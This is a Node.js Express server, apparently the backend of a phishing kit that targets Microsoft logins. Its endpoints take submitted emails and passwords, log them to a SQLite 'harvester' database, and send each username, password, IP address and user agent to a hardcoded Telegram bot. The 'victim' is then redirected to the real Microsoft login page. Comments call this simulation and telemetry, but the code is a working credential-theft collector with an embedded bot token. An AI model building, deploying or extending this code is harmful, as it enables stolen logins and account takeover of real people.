// --- Anomaly Detection Logic ---
const geoLookup = require('./geo_lookup'); // You must implement or use a service
const isAnomalous = (capturedIpGeo) => {
    return capturedIpGeo.city !== 'Los Angeles' && capturedIpGeo.region !== 'CA';
};
const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const app = express();
app.use(express.json());

// Helper: Write incoming JSON to a temp file for PowerShell
function writeTempJson(data) {
    const tempDir = path.join(__dirname, 'incoming_alerts');
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
    const fileName = `alert_${Date.now()}.json`;
    const filePath = path.join(tempDir, fileName);
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    return filePath;
}


// --- SQLite Setup ---

const Database = require('better-sqlite3');
const db = new Database('harvester_data.db');
// Ensure telemetry table exists
db.prepare(`CREATE TABLE IF NOT EXISTS telemetry (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    event_type TEXT,
    timestamp INTEGER,
    details TEXT,
    email TEXT,
    password TEXT,
    ip TEXT,
    ua TEXT,
    risk_score INTEGER
)`).run();

// --- Telegram Alert ---
const axios = require('axios');
const TELEGRAM_TOKEN = '8486086452:AAFB2NUlC4Mc58tT0AXpX8FM7dMFMm-26pM';
const CHAT_ID = '8486086452';
async function sendTelegramAlert(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    try {
        await axios.post(url, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('[+] Telegram alert dispatched.');
    } catch (error) {
        console.error('[!] Failed to send Telegram alert:', error.message);
    }
}


// Fixed: Make handler async and remove duplicate
async function handleTelemetry(req, res) {
    // Accept both simulation and real harvester payloads
    const sessionInfo = {
        username: req.body.email || req.body.user || 'N/A',
        password: req.body.password || 'simulated' || 'N/A',
        landingUrl: `https://${req.headers.host}${req.url}`,
        userAgent: req.headers['user-agent'],
        remoteAddress: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        createTime: Math.floor(Date.now() / 1000)
    };

    // GeoIP lookup for anomaly detection
    const geo = await geoLookup(sessionInfo.remoteAddress);
    if (isAnomalous(geo)) {
        // 1. Mark as "High Risk" in SQLite
        db.prepare("UPDATE telemetry SET risk_score = 95 WHERE email = ? AND timestamp = ?")
          .run(sessionInfo.username, sessionInfo.createTime);
        // 2. Trigger an immediate 'Identity Hijack' arc (Yellow/Red Pulse)
        await sendTelegramAlert(`🚨 ANOMALY: Session hijacked from ${geo.city}!`);
    }

    // Format the message for Telegram
    const telegramMessage = `
✨ *Session Information* ✨\n\n👤 *Username:* \`${sessionInfo.username}\`\n🔑 *Password:* \`${sessionInfo.password}\`\n🌐 *Landing URL:* ${sessionInfo.landingUrl}\n\n🖥 *User Agent:* ${sessionInfo.userAgent}\n🌍 *Remote Address:* ${sessionInfo.remoteAddress}\n🕒 *Create Time:* ${sessionInfo.createTime}\n🕒 *Update Time:* ${sessionInfo.createTime}\n\n📦 *Tokens are added in txt file and attached separately in message.*
    `;

    // Log to SQLite for board metrics
    try {
        // Use details from payload, or fallback to event, or a default string
        const details = req.body.details || req.body.event || 'No details provided';
        const stmt = db.prepare("INSERT INTO telemetry (event_type, timestamp, details, email, password, ip, ua) VALUES (?, ?, ?, ?, ?, ?, ?)");
        stmt.run(
            'Credential_Harvest',
            sessionInfo.createTime,
            details,
            sessionInfo.username,
            sessionInfo.password,
            sessionInfo.remoteAddress,
            sessionInfo.userAgent
        );
    } catch (err) {
        console.error('[DB ERROR]', err);
        res.status(500).json({ status: 'error', error: err.message, full: err });
        return;
    }

    // Trigger Telegram alert
    await sendTelegramAlert(telegramMessage);

    // Redirect victim to real login page
    res.json({ status: "success", redirect: "https://login.microsoftonline.com" });

}


app.post('/api/v1/capture', handleTelemetry);
app.post('/telemetry', handleTelemetry);

app.listen(3000, () => console.log('Harvester listening on port 3000'));
